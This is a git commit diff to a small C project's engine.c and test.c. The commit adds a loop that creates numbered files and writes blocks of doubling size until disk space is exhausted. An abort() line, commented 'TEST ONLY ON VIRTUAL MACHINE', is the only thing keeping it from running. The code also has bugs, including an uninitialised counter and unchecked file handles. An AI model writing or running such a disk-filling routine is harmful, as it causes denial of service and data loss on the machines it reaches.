5c79ed328f057f5f355439c2d9c5337b7785de46
DaniilAev <daniilaev415@gmail.com>
2026-09-21 20:56:56 +0300

    feat: updated engine

--- engine.c
+++ engine.c
@@ -1,25 +1,37 @@
 #include <stdio.h>
 #include <stdlib.h>
-int test();
+#include "engine.h"
+
 char filename[128] = "0";
 int engine(){
-    return test();
+    char filename[128] = "\0";
+    int result_of_test;
+    int files_counter;
+    int result_of_writing = 0;
+    long size_of_file = 32768;
+    char *space;
+    FILE* file;
+    result_of_test = test();
 
+    if (result_of_test != 0){
+        return result_of_test;
+    }
 
+    space = (char*)malloc(size_of_file);
 
+    while (size_of_file > 0)
+    {     
+            abort(); // Delete for testing. TEST ONLY ON VIRTUAL MACHINE!
+            sprintf(filename, "%d", files_counter++);
+            file = fopen(filename, "w");
+            result_of_writing = fwrite(space, sizeof(char), size_of_file, file);
+            fclose(file);
+            if (result_of_writing != 0){
+                size_of_file <<= 1;
+            }
+    }
 
+    free(space);
 
-
-
-    /*while (size_of_file > 0)
-    {
-        if (not_success){
-            size_of_file << 2;
-            not_success = 0;
-        }
-        sprintf(filename, "%d", number_of_files);
-        file = fopen(filename, "r");
-
-    }*/
-    
+   return 0;
 }
--- test.c
+++ test.c
@@ -4,33 +4,55 @@ int test(){
     FILE* file;
     int result_of_operation;
     char* test = "Testing...\n";
+    char* space;
 
     fprintf(stdout, "%s", test);
+
+    /*Folder creting test*/
     result_of_operation = system("mkdir test");
     if (result_of_operation != 0){
         return 1;
     }
+
+    /*Creating file test*/
     file = fopen("test\\test", "w");
     if (file == NULL){
         return 2;
     }
-    fwrite("kolbasa", sizeof(char) , 7, file);
+
+    /*Mem allocating test*/
+    space = (char*)malloc(32768);
+    if (space == NULL){
+        return 7;
+    }
+
+    /*Writing test*/
+    fwrite(space, sizeof(char) , 32768, file);
+    free(space);
     result_of_operation = ferror(file);
     if (result_of_operation != 0){
         fclose(file);
         return 3;
     }
+
+    /*File closing test*/
     result_of_operation = fclose(file);
     if (result_of_operation != 0){
         return 4;
     }
+
+    /*File removing test*/
     result_of_operation = remove("test\\test");
     if (result_of_operation != 0){
         return 5;
     }
+
+    /*Folder deleting test*/
     result_of_operation = system("rmdir test");
     if (result_of_operation != 0){
         return 6;
     }
+
+    /*Successfuly*/
     return 0;    
 }
